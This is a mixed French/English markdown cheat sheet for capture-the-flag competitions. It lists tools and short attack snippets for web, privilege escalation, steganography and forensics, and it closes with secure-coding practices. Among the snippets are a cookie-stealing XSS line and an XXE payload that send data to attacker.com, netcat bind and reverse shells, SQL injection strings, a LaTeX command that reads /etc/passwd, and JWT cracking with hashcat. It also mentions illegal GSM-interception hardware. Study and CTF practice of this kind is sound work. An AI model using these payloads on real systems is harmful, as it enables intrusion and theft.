# CTF Toolbox

* [CTF Tools](https://github.com/zardus/ctf-tools) CTF tools in git repo


### ENcode/DEcode tools

* [URL Encoder](https://www.urlencoder.org/)
* [Base 64, Hex, Binary](https://string-functions.com/)
* [MD5 decoder](https://www.md5online.org/md5-decrypt.html)
* [JWT decoder](https://www.jsonwebtoken.io/)
* [DevToys App](https://devtoys.app/) (Windows local installation)
* [stylesuxx](https://stylesuxx.github.io/steganography/) Steganography Online
* [pdf tools](https://www.pdfzero.com/split)

### General resources

* [OWASP](https://owasp.org) Testing Guide : Open Web Application Security Project.
* [portswigger.net](https://portswigger.net/blog/server-side-template-injection) Tests de moteurs de templates
* [exploit-db.com](https://exploit-db.com) Vulnérabilités connues


## Passwords

### Resources

* [zxcvbn](https://github.com/zxcvbn-ts) Low-Budget Password Strength Estimation
* [haveibeenpwned.com](https://haveibeenpwned.com) Tester la compromission de son adresse mail
* [password list 1](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords)
* [password list 2](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
* [cisco password crack](http://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html)


## Privilege Escalation

*Goals:* Attention aux chemins avec espaces non entourés de quotes concernant les services exécutés en tant que SYSTEM. 

Détection des services concernés:
```bash
# 
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

Vérifier les droits décriture sur les dossiers parents:
```bash
icacls "C:\Program Files (x86)\Common Files"
# vulnérabilité présente si utilisateur BUILTIN\Users:(W)
```

### Sensitive files to inspect

```bash
cat /var/log/apache2
cat /var/log/auth.log
cat /proc/self/environ (environnement envoyé par les requetes HTTP par ex) ; fd (open files)
```

### Resources

* [medium.com](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae) Windows Privileges Escalation






## Website hacking

### Javascript injections

*Goals:* Injection de javascript/HTML via formulaire HTML ou URL, Vol de session administrateur / tierce

```javascript
// Basic testing
<script type="text/javascript">alert('test')</script>
```

### SQL Injections

*Goals:* Récupérations d'informations sensibles de la base de données

Basic Login hacking:
```sql
-- test 1
' OR 1=1; -- -
--  test 2
1' || 1=1 # -
-- test 3
... ORDER BY 1, 2, 3, 4, 5, 6, ... 10, 15
```

Extract data to file and read it:
```sql
SELECT ... INTO OUTFILE ;
SELECT LOAD_FILE ...;
information_schema.schemata, information_schema.columns, ...
VERSION(), USER()
```


### Cross-Site Request Forgery (CSRF)

*Goals:* Récupérer la session d'un site externe via envoi d'un formulaire non HTTPS

```html
document.write('<img src="http://attacker.com:8080/cookie?' + document.cookie + '"/>');
<form action="..."><input type="hidden"/>...</form><script>document.forms[0].submit();</script>

```

### Server-Side Request Forgery (SSRF)

*Goals:* Utilisation d'un formulaire d'envoi d'image pour scanner le serveur

Outil: BurpSuite + Intruder:
```bash
http://ip.locale:port
```

### File Injection

*Goals:* Utiliser la fonction d'import de fichier pour injecter du code interprétable.
```bash
# 1. Code PHP en fin de fichier PNG
# 2. Bulletproof JPEGs (code php présent même après réduction de l'image)
# 3. 
curl --user-agent='<?php phpinfo();?>'
```


### JWT tools

hashcat, jwtbrute : permet de casser des clés JWT (360 millions/sec):
```bash
hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a
```

### Resources

* [archive.org](https://archive.org/web/) view old versions of web pages
* [JWT decoder](https://www.jsonwebtoken.io/)




## XML Injections

*Goals:* 

Billion Laughs: Inclusion exponentielle d'entités XML
```xml
<!ENTITY lol "lol"> <!ENTITY lol2 "&lol; &lol;">
```

Lire des fichiers sur le serveur
```bash
<!ENTITY faille SYSTEM "file:///etc/passwd"> <!ENTITY attacker SYSTEM "https://attacker.com?%faille;">
<data>&faille;</data>
```


## Network analysis

*Goals:* Scan the network and identify open doors

```
# port scanning
nmap 172.30.0.14/28 -p- -sC -sV

# get the tree from runnning web application
dirb http://172.30.0.2/


```


## Remote server injections

### Command Injections

*Goals:* Accès à distance sur le serveur. Màj de fichiers. Accès root. déni de service...

BindShell:
```bash
# Open a shell from a remote machine
nc -lp 1234 -e /bin/sh
# from local machine
nc <ip_victime> 1234
```

ReverseShell:
```bash
# From local machine
nc -lvp 1234
# From remove machine
nc <ip_attaquant> 1234 /bin/sh
```

InteractiveShell:
```bash
python -c 'import pty; pty.spawn("/bin/bash");'
```

Injection Code:
```
{cat,/etc/passwd}
```

Make a quick http server:
```bash
python -m SimpleHttpServer 8080 ; php -S 8080
```


## Code vulnerabilities

### PHP Injection

*Goals:* Extract PHP data from a form or a posted image

```php
var_dump(serialize($obj));
```

### LaTeX Injection

*Goals:* Les documents LaTex peuvent contenir des commandes système

```bash
\immediate\write18{cat /etc/passwd | base64 > /tmp/ouned.tex}
# pour sécuriser: option -no-shell-escape [hacking-with-latex](https://0day.work/hacking-with-latex) ; [pdflatex](https://linux.die.net/man/1/pdflatex)
```

### Binary code analysis

*Goals:* Decompiler des applications binaires

* [ida-free](https://hex-rays.com/ida-free/) The free binary code analysis tool to kickstart your reverse engineering experience.

### Resources

* [ripstech.com](https://ripstech.com) Validation sécurité PHP
* strings: Permet de sortir les caractères affichables d’un fichier ou d’un flux
* binwalk: Permet d’identifier les codes/données incorporés dans le fichier et et rechercher les images, binaires, code exécutable, ...
* hd, Ghex: Outil de manipulation hexadécimal d'une image
* Dumpzilla: Outil manipulant les données de profiles firefox (dump password, historique, ...)


## Steganography

### Resources

* [virtualabs.fr](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l) Bulletproof JPEGs
* [stylesuxx](https://stylesuxx.github.io/steganography/) Steganography Online
* [Audiostego](https://github.com/danielcardeenas/AudioStego) Outil permettant de cacher/trouver de la donnée cachée dans un fichier WAV/MP3
* [spectrology](https://github.com/solusipse/spectrology) Encoder une image dans un spectrogramme audio
* [mp3stego](https://www.petitcolas.net/steganography/mp3stego/) Outil Windows permettant de cacher de la donnée dans un mp3 ou wav. Disponible sous Windows only
* [LSB-Steganographie](https://github.com/RobinDavid/LSB-Steganography) encoder/décoder de la data en modifiant les bits de couleur (LSB)
* unzip
* exiftool
* gimp
* Steghide Permet de dissimuler du texte dans un fichier (image ou son)
* [Stegsolve](http://www.caesum.com/handbook/Stegsolve.jar) Permet de manipuler des images en fonction des pixels, filtres, ...
* [stegoveritas](https://github.com/bannsec/stegoVeritas) Outil disposant de nombreuses fonctionnalités :  vérifier les métadonnées, créer de nombreuses images transformées, Brute forces LSB, ...
* [jphide / jpseek](http://linux01.gwdg.de/~alatham/stego.html) [ssak](https://github.com/mmayfield1/SSAK) Permet de dissimuler/extraire de la donnée cachée dans un JPG
* [jsteg](https://github.com/lukechampine/jsteg) Permet de cacher / extraire via le LSB d'un JPG
* [openstego](https://github.com/syvaidya/openstego) Permet de manipuler le LSB (sous plusieurs algorithme) d'un PNG
* outguess
* [stegano](https://github.com/cedricbonhomme/Stegano) Cacher/extraire de la donnée via LSB (Plusieurs methodes) d'un fichier PNG
* [cloackedpixel](https://github.com/livz/cloacked-pixel) Outil de manipulation LSB pour PNG
* pdf-parser, peepdf: Outil d'analyse de pdf (avec un mode interactif) Très utile pour tracer les liens des catalogues, stream, objects, ...
* stegsnow: Permet d'insérer de la donnée ASCII invisible dans du texte
* TweakPNG (Windows): Valider la structure d'un PNG, voir l'intégralité des chunks (blocs IDAT présents par exemple)

## Cipher

*Goals:* Attaque possible par bourrage si couple PKCS7/CBC (Cipher Block Chaining) utilisé.

## Disk tools

*Goals:* Retrieve deleted files from disk

### Resources

* Foremost: Outil permettant de récupérer des fichiers qui ont été supprimés
* dd_rescue: Outil permettant de récupérer des fichiers qui ont été supprimés
* scalpel: Outil permettant de disséquer les fichiers stockés sur le disque dur
* ntfsundelete: Outil permettant de récupérer des fichiers effacés sur le système de fichier NTFS
* fatback: Outil permettant de récupérer des fichiers effacés sur le système de ficher FAT
* sleuthkit: Ensemble d’outil permettant d’investiguer sur des partition NTFS, FAT, EXT2, EXT3, EXT4, FFS, ...
* Photorec: Permet de retrouver des fichiers supprimés sur des disques dur, CDROM, Caméra digital, ...
* kpartx: Permet de monter une partition avec un fichier image (Like Daemon Tool)
* [chainbreaker](https://github.com/AppLeU0/chainbreaker): Pour ouvrir un keychain MacOS sous linux
* plistutil: Permet de lire des fichiers Apple Binary Property en XML
* [MacInHash](https://github.com/JMagers/MacinHash): Permet de convertir un mot de passe plist en fichier hash pour cracking


## To go further

### Other tools

* [Awesome CTF](https://github.com/apsdehal/awesome-ctf)
* [CTF Tools](https://github.com/zardus/ctf-tools)
* [CTF examples](https://k-lfa.info/tag/ctf/) Quelques CTFs

### Kali Linux Tools

```bash
# kali linux : sqlmap
# sqlmap --url="" --forms -v3 --cookie="" --threads=2 (cookie=document.cookie dans le navigateur)
# Recherche les failles dans les formulaires HTML
# Méthode time_based: SLEEP ou BENCHMARK pour détecter si le code est exécuté
# Méthode bool_based: AND x between 'a' and 'm' : recherche dichotomique sur le champ recherché

# kali linux: beEF Xss framework

# kali linux: BuRP
# Plugin Authorize: Teste sur chaque requête le mode authentifié / non authentifié / admin

# kali linux: Intruder: 
# Rejouer les requêtes paramétrées pour scanner un réseau par exemple.
# proxy local pas-à-pas HTTP. Headers modifiables. Rejouable dans Intruder
```


### Material tools

* Clé TNT modifiée permettant d'écouter le réseau GSM par exemple (illégal. NooElec, env. 20€)
* Fournisseur téléphonique (SFR/Free/... illégal. BladeRF, nuand.com, env. 500€)
* Brutalis : 8 GPU casseur de mdp: env. 250 milliards de md5 par seconde. sagitta.pw


### Library

Social Engineering:

* Silence on the Wire - Michal Zalewski
* Hacking, the Art Of Exploitation - Jon Erickson

### Glossary

* Vulnérabilité: Erreur de conception. Elle peut être logique (scénario mal conçu) ou technique (pb de sécurité, ...)
* Menace: Element (naruel, humain, technique) exploitant une vulnérabilité
* Exploit: Scénario décrivant l'exploitation d'une vulnérabilité

### Good practices

* Ne pas stocker les mdp en clair en base de données
* Implémenter la sécurité dès le début de la conception ; la vérifier
* Authentification user/mdp : facile mais prévoir garde-fous (logs, en clair le moins d'endroits possibles)
* Perte mot de passe : pas de mdp en clair par mail, ne pas remplacer le mdp existant dès la demande effectuée
* Authentification OTP (One Time Password) : Mdp + clé générée. Nécessite un périphérique (téléphone, jeton, ...)
* Messages d'erreurs : fournir le moins d'informations possibles. Une erreur générique suffit pour ne pas distinguer les différents cas d'erreurs
* Une session doit périmée, interrompue, sécurisée (flag cookie secure envoyé que sur HTTPS ou httpOnly pour ne pas être utilisé par javascript), être détruite côté serveur à la déconnexion
* Token JWT : ne pas autoriser l'algorithme "none" (pas de signature). Avoir un "secret" robuste
* SQL: utiliser des frameworks (ORM), prepared statements, ...
* Formulaires HTML : créer des tokens (jeton CSRF) pour authentifier le formulaire
* Pas d'infos sensibles dans les logs
* Clé symétrique : minimum 128 bits. Clé asymétrique : minimum 2048 bits. Entropie : utiliser Crypt RNG pour l'aléatoire. Une clé par application
